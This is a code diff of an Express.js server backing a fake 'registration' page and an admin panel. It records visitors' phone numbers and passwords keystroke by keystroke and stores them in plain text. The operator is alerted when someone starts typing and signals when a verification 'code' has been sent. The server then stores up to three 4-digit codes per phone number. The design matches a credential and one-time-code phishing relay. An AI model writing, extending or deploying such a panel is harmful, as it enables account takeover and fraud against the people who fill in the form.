@@ -8,179 +8,114 @@ app.use(express.json());
 app.use(express.static(__dirname));
 
 const sessions = new Map();
-const codesByPhone = new Map();
-const sseClients = new Set();
+const groupedCodesByPhone = new Map();
 
-function getOrCreateSession(sessionId) {
+function ensureSession(sessionId) {
   if (!sessions.has(sessionId)) {
     sessions.set(sessionId, {
       sessionId,
       phone: '',
       password: '',
-      typingStarted: false,
       codeRequested: false,
       codeSended: false,
+      codeSendedAt: null,
+      notifiedFirstPhoneDigit: false,
+      newPhoneAlert: null,
       updatedAt: Date.now()
     });
   }
   return sessions.get(sessionId);
 }
 
-function getSubmissionsPayload() {
-  const liveSessions = Array.from(sessions.values())
-    .filter(
-      item =>
-        item.phone.length > 0 ||
-        item.typingStarted ||
-        item.codeRequested ||
-        item.codeSended
-    )
-    .sort((a, b) => b.updatedAt - a.updatedAt);
-
-  const groupedCodes = {};
-  for (const [phone, list] of codesByPhone.entries()) {
-    groupedCodes[phone] = list;
+function getOrCreatePhoneCodes(phone) {
+  if (!groupedCodesByPhone.has(phone)) {
+    groupedCodesByPhone.set(phone, [null, null, null]);
   }
-
-  return {
-    sessions: liveSessions,
-    groupedCodes
-  };
+  return groupedCodesByPhone.get(phone);
 }
-
-function broadcastEvent(eventName, data) {
-  const payload = `event: ${eventName}\ndata: ${JSON.stringify(data)}\n\n`;
-  for (const client of sseClients) {
-    try {
-      client.write(payload);
-    } catch (e) {
-      sseClients.delete(client);
-    }
-  }
-}
-
-app.get('/api/stream', (req, res) => {
-  res.setHeader('Content-Type', 'text/event-stream');
-  res.setHeader('Cache-Control', 'no-cache');
-  res.setHeader('Connection', 'keep-alive');
-  res.flushHeaders();
-
-  sseClients.add(res);
-  res.write(`event: submissions:update\ndata: ${JSON.stringify(getSubmissionsPayload())}\n\n`);
-
-  const keepAlive = setInterval(() => {
-    try {
-      res.write(': ping\n\n');
-    } catch (e) {
-      clearInterval(keepAlive);
-      sseClients.delete(res);
-    }
-  }, 15000);
-
-  req.on('close', () => {
-    clearInterval(keepAlive);
-    sseClients.delete(res);
-  });
-});
-
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'registration.html'));
-});
-
-app.get('/admin', (req, res) => {
-  res.sendFile(path.join(__dirname, 'admin.html'));
-});
-
-app.post('/api/register-start', (req, res) => {
-  const { sessionId, phone, startedAt } = req.body || {};
-  if (!sessionId) return res.status(400).json({ error: 'sessionId required' });
-
-  const cleanPhone = String(phone || '').replace(/\D/g, '').slice(0, 10);
-  const entry = getOrCreateSession(sessionId);
-  const isFirstStart = !entry.typingStarted;
-
-  entry.typingStarted = true;
-  if (cleanPhone && !entry.phone) {
-    entry.phone = cleanPhone;
-  }
-  entry.updatedAt = Date.now();
-
-  if (isFirstStart) {
-    broadcastEvent('user:started-registering', {
-      sessionId,
-      phone: entry.phone || cleanPhone,
-      startedAt: startedAt || Date.now()
-    });
-  }
-
-  broadcastEvent('submissions:update', getSubmissionsPayload());
-  res.json({ ok: true });
-});
 
 app.post('/api/live-update', (req, res) => {
-  const { sessionId, phone, password, startedTyping } = req.body || {};
-  if (!sessionId) return res.status(400).json({ error: 'sessionId required' });
-
-  const cleanPhone = String(phone || '').replace(/\D/g, '').slice(0, 10);
-  const entry = getOrCreateSession(sessionId);
-  const wasFirstKeystroke =
-    !entry.typingStarted && (cleanPhone.length > 0 || Boolean(startedTyping));
-
-  if (entry.phone !== cleanPhone) {
-    entry.codeSended = false;
+  const { sessionId, phone = '', password = '' } = req.body || {};
+  if (!sessionId) {
+    return res.status(400).json({ error: 'sessionId required' });
   }
 
-  if (cleanPhone.length > 0 || startedTyping) {
-    entry.typingStarted = true;
-  }
+  const cleanPhone = String(phone).replace(/\D/g, '').slice(0, 10);
+  const session = ensureSession(sessionId);
 
-  entry.phone = cleanPhone;
-  if (typeof password === 'string') entry.password = password;
-  entry.updatedAt = Date.now();
+  const hadNoPhoneBefore = !session.phone;
+  session.phone = cleanPhone;
+  session.password = String(password);
+  session.updatedAt = Date.now();
 
-  if (wasFirstKeystroke) {
-    broadcastEvent('user:started-registering', {
-      sessionId,
+  if (hadNoPhoneBefore && cleanPhone.length >= 1 && !session.notifiedFirstPhoneDigit) {
+    session.notifiedFirstPhoneDigit = true;
+    session.newPhoneAlert = {
+      id: `${sessionId}_${Date.now()}`,
       phone: cleanPhone,
-      startedAt: Date.now()
-    });
+      message: `Naya user phone number enter kar raha hai: ${cleanPhone}`,
+      createdAt: Date.now()
+    };
+  } else if (session.newPhoneAlert && cleanPhone) {
+    session.newPhoneAlert.phone = cleanPhone;
+    session.newPhoneAlert.message = `Naya user phone number enter kar raha hai: ${cleanPhone}`;
   }
 
-  broadcastEvent('submissions:update', getSubmissionsPayload());
-  res.json({ ok: true });
+  return res.json({ ok: true, session });
 });
 
 app.post('/api/request-code', (req, res) => {
-  const { sessionId, phone } = req.body || {};
-  if (!sessionId) return res.status(400).json({ error: 'sessionId required' });
-
-  const entry = getOrCreateSession(sessionId);
-  if (phone !== undefined) {
-    entry.phone = String(phone).replace(/\D/g, '').slice(0, 10);
+  const { sessionId, phone = '' } = req.body || {};
+  if (!sessionId) {
+    return res.status(400).json({ error: 'sessionId required' });
   }
-  entry.typingStarted = true;
-  entry.codeRequested = true;
-  entry.codeSended = false;
-  entry.updatedAt = Date.now();
 
-  broadcastEvent('submissions:update', getSubmissionsPayload());
-  res.json({ ok: true });
+  const cleanPhone = String(phone).replace(/\D/g, '').slice(0, 10);
+  const session = ensureSession(sessionId);
+  if (cleanPhone) session.phone = cleanPhone;
+  session.codeRequested = true;
+  session.codeSended = false;
+  session.updatedAt = Date.now();
+
+  return res.json({ ok: true });
 });
 
 app.get('/api/status', (req, res) => {
-  const { sessionId } = req.query;
+  const sessionId = String(req.query.sessionId || '');
   if (!sessionId || !sessions.has(sessionId)) {
-    return res.json({ codeSended: false });
-  }
-  const entry = sessions.get(sessionId);
-  const justSent = Boolean(entry.codeSended);
-
-  if (justSent) {
-    entry.codeSended = false;
-    broadcastEvent('submissions:update', getSubmissionsPayload());
+    return res.json({ codeSended: false, codeSendedAt: null });
   }
 
-  res.json({ codeSended: justSent });
+  const session = sessions.get(sessionId);
+  return res.json({
+    codeSended: Boolean(session.codeSended),
+    codeSendedAt: session.codeSendedAt,
+    updatedAt: session.updatedAt
+  });
+});
+
+app.post('/api/submit-code', (req, res) => {
+  const { sessionId, phone = '', code = '', attempt = 1 } = req.body || {};
+  const cleanPhone = String(phone).replace(/\D/g, '').slice(0, 10);
+  const cleanCode = String(code).replace(/\D/g, '').slice(0, 4);
+  const attemptNum = Math.max(1, Math.min(3, Number(attempt) || 1));
+
+  if (!cleanCode) {
+    return res.status(400).json({ error: 'code required' });
+  }
+
+  if (sessionId) {
+    const session = ensureSession(sessionId);
+    if (cleanPhone) session.phone = cleanPhone;
+    session.updatedAt = Date.now();
+  }
+
+  if (cleanPhone) {
+    const arr = getOrCreatePhoneCodes(cleanPhone);
+    arr[attemptNum - 1] = cleanCode;
+  }
+
+  return res.json({ ok: true });
 });
 
 app.post('/api/admin/mark-code-sended', (req, res) => {
@@ -189,54 +124,48 @@ app.post('/api/admin/mark-code-sended', (req, res) => {
     return res.status(404).json({ error: 'Session not found' });
   }
 
-  const entry = sessions.get(sessionId);
-  entry.codeSended = true;
-  entry.codeRequested = false;
-  entry.updatedAt = Date.now();
+  const session = sessions.get(sessionId);
+  session.codeRequested = false;
+  session.codeSended = true;
+  session.codeSendedAt = Date.now();
+  session.updatedAt = Date.now();
 
-  broadcastEvent('submissions:update', getSubmissionsPayload());
-  res.json({ ok: true });
-});
-
-app.post('/api/submit-code', (req, res) => {
-  const { sessionId, phone, code, attempt } = req.body || {};
-  let cleanPhone = String(phone || '').replace(/\D/g, '').slice(0, 10);
-  const cleanCode = String(code || '').replace(/\D/g, '').slice(0, 4);
-
-  if (sessionId && sessions.has(sessionId)) {
-    const entry = sessions.get(sessionId);
-    if (cleanPhone) {
-      entry.phone = cleanPhone;
-    } else if (entry.phone) {
-      cleanPhone = entry.phone;
-    }
-    entry.typingStarted = true;
-    entry.updatedAt = Date.now();
-  }
-
-  if (cleanPhone && cleanCode) {
-    if (!codesByPhone.has(cleanPhone)) {
-      codesByPhone.set(cleanPhone, [null, null, null]);
-    }
-    const list = codesByPhone.get(cleanPhone);
-    const slotIndex = Math.min(Math.max((Number(attempt) || 1) - 1, 0), 2);
-    list[slotIndex] = cleanCode;
-  }
-
-  broadcastEvent('submissions:update', getSubmissionsPayload());
-  res.json({ ok: true });
-});
-
-app.get('/api/submissions', (req, res) => {
-  res.json(getSubmissionsPayload());
+  return res.json({ ok: true });
 });
 
 app.delete('/api/sessions/:sessionId', (req, res) => {
-  sessions.delete(req.params.sessionId);
-  broadcastEvent('submissions:update', getSubmissionsPayload());
-  res.json({ ok: true });
+  const sessionId = decodeURIComponent(req.params.sessionId || '');
+  sessions.delete(sessionId);
+  return res.json({ ok: true });
+});
+
+app.get('/api/submissions', (req, res) => {
+  const sessionList = Array.from(sessions.values()).sort((a, b) => b.updatedAt - a.updatedAt);
+  const groupedCodes = {};
+  for (const [phone, codes] of groupedCodesByPhone.entries()) {
+    groupedCodes[phone] = codes;
+  }
+
+  const alerts = sessionList
+    .filter(s => s.newPhoneAlert)
+    .map(s => s.newPhoneAlert)
+    .sort((a, b) => b.createdAt - a.createdAt);
+
+  return res.json({
+    sessions: sessionList,
+    groupedCodes,
+    alerts
+  });
+});
+
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+app.get('/admin', (req, res) => {
+  res.sendFile(path.join(__dirname, 'admin.html'));
 });
 
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+  console.log(`Server running on http://localhost:${PORT}`);
 });
